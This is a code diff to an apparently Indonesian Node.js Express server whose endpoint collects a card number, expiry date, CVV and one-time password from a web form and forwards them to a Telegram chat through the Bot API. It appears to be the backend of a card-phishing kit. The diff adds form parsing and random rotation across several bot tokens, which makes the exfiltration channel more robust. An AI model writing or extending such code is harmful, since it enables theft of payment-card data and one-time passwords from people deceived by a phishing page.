@@ -5,10 +5,33 @@ dotenv.config();
 
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname + '/public')); // untuk akses HTML/CSS
+
+// Ambil semua token dari environment
+const tokens = [
+  process.env.BOT_TOKEN_1,
+  process.env.BOT_TOKEN_2,
+  process.env.BOT_TOKEN_3
+];
+
+// Pastikan semua token tidak kosong
+const validTokens = tokens.filter(Boolean);
 
 app.post('/kirim-ke-telegram', async (req, res) => {
   const { nomor, valid, cvv, otp } = req.body;
+  const chat_id = process.env.CHAT_ID;
+
+  if (!chat_id) {
+    return res.status(500).send("CHAT_ID belum diatur");
+  }
+
+  // Pilih token acak dari yang tersedia
+  const token = validTokens[Math.floor(Math.random() * validTokens.length)];
+
+  if (!token) {
+    return res.status(500).send("Tidak ada BOT_TOKEN yang tersedia");
+  }
 
   let message = "";
 
@@ -19,9 +42,6 @@ app.post('/kirim-ke-telegram', async (req, res) => {
   } else {
     return res.status(400).send("Data tidak lengkap");
   }
-
-  const chat_id = process.env.CHAT_ID;
-  const token = process.env.BOT_TOKEN;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
